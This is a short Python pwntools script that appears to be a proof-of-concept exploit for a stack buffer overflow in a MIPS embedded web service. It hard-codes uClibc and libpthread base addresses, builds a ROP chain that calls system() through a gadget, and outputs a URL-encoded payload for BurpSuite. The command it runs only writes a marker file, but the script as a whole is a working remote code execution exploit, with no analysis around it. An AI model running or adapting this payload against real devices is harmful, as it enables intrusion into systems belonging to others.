from pwn import *
import urllib.parse

libuclibc_base = 0x7790e000
libpthread_base = 0x77981000

system_offset = 0x50150
call_gadget_offset = 0x53bc

system_addr = libuclibc_base + system_offset
call_gadget_addr = libpthread_base + call_gadget_offset

cmd = b"sleep 2; echo RCE_SUCCESS > /tmp/1.txt"
buffer_start_addr = 0x7d1ff814
command_string_addr = buffer_start_addr + 0x64

data_area = b''
data_area += b'A' * 0x5c
data_area += p32(system_addr, endian='big')       # for call_gadget's lw $t9
data_area += p32(command_string_addr, endian='big') # for call_gadget's lw $a0
data_area += cmd + b'\x00'

padding_to_s0 = b'B' * (870 - len(data_area))

rop_chain = b''
rop_chain += p32(buffer_start_addr, endian='big')
rop_chain += b'C' * (4 * 7)
rop_chain += p32(call_gadget_addr, endian='big')

payload = data_area + padding_to_s0 + rop_chain

print(f"[*] Payload length: {len(payload)} bytes")
encoded_payload = urllib.parse.quote_plus(payload)
print("\n[+] URL-Encoded Payload (for BurpSuite):")
print(encoded_payload)
